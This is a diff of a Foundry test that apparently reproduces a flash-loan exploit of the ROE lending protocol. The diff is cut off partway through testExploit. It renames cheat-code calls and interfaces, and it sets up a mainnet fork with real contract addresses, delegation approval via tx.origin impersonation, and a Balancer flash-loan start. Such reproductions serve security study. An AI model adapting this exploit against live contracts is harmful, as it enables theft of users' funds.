@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/BlockSecTeam/status/1613267000913960976
@@ -12,13 +11,8 @@ import "./../interface.sol";
 interface ROE {
 
     function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
-    function borrow(
-        address asset,
-        uint256 amount,
-        uint256 interestRateMode,
-        uint16 referralCode,
-        address onBehalfOf
-    ) external;
+    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+        external;
 
 }
 
@@ -32,8 +26,8 @@ contract ContractTest is Test {
 
     IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     ROE roe = ROE(0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0x004375Dff511095CC5A197A54140a24eFEF3A416);
-    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0x004375Dff511095CC5A197A54140a24eFEF3A416);
+    IUniswapV2Router Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
     vdWBTC_USDC_LP LP = vdWBTC_USDC_LP(0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24);
     IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -42,20 +36,18 @@ contract ContractTest is Test {
     address roeWBTC_USDC_LP = 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c;
     uint256 flashLoanAmount = 5_673_090_338_021;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("mainnet", 16_384_469);
-        cheats.label(address(roe), "ROE");
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(WBTC), "WBTC");
-        cheats.label(address(Pair), "Uni-Pair");
+        vm.createSelectFork("mainnet", 16_384_469);
+        vm.label(address(roe), "ROE");
+        vm.label(address(USDC), "USDC");
+        vm.label(address(WBTC), "WBTC");
+        vm.label(address(Pair), "Uni-Pair");
     }
 
     function testExploit() external {
-        cheats.startPrank(address(tx.origin));
+        vm.startPrank(address(tx.origin));
         LP.approveDelegation(address(this), type(uint256).max);
-        cheats.stopPrank();
+        vm.stopPrank();
         address[] memory tokens = new address[](1);
         tokens[0] = address(USDC);
         uint256[] memory amounts = new uint256[](1);
